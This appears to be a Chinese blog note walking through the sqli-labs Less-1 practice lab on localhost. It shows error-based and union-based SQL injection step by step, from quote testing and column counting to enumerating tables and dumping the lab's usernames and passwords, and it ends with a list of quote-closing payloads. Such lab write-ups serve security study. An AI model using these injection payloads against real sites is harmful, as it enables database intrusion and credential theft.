---
title: "网安笔记 - 靶场实例 - sql注入 - sqlilabs - 简要思路-有报错回显"
category: "网安笔记"
date: 2025-10-30
published: 2025-10-30
author: "Rin"
---

首先判断一下传参类型是字符型还是数字型 由于URL为(http://127.0.0.1/sqlilabs/Less-1/?id=1)
那么我们在1后直接加个 **'** 试试
此时网站进行了报错 报错内容为:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
我们可以看到 1附近有两个单引号 由于其中有一个是我们自己加上去的 那么可以初步判断拼接语句为: **SELECT * FROM xxx where id='$id' LIMIT 0,1**
接下来就到了sql注入经典环节: 闭合特殊符号 构造sql语句
先猜一下列数 根据初步判断的拼接语句 我们可以构造如下注入语句
**1' order by 4--+** （--+是为了注释掉后面多余的单引号和limit语句 ）
发现报错**Unknown column '4' in 'order clause'** 这证明我们的拼接语法猜对了 但是列数没有猜对 继续猜发现当注入语句为**1' order by 3--+** 的时候 页面正常回显 那么我们就知道了这个表的列数为3
之后进入下一个环节:爆数据库
先看一眼回显 **-1' union select 1,2,3--+** 发现页面回显为2和3  那么我们之后爆想要的内容的时候直接从2,3入手即可
爆数据库语句:**-1' union select 1,database(),3--+** 页面回显了**security** 这证明了我们的思路是正确的 并且爆出了当前页面的数据库名:security
接下来就是爆表名爆字段名环节
注入语句:**-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+**
爆出的表名为:emails,referers,uagents,users
很明显 我们最想看的是users表
那么就爆users表的字段名
**-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+**
页面回显出了字段表:id,username,password
**到了最后一步 生气的黑客来了 接下来直接爆字段内容即可**
**-1' union select 1,group_concat(username),group_concat(password) from users--+**
页面回显出了:
Your Login name: Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4  
Your Password:
Dumb,I-kil-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4

### 常见的符号闭合思路
1'
1"
1')
1")
1'))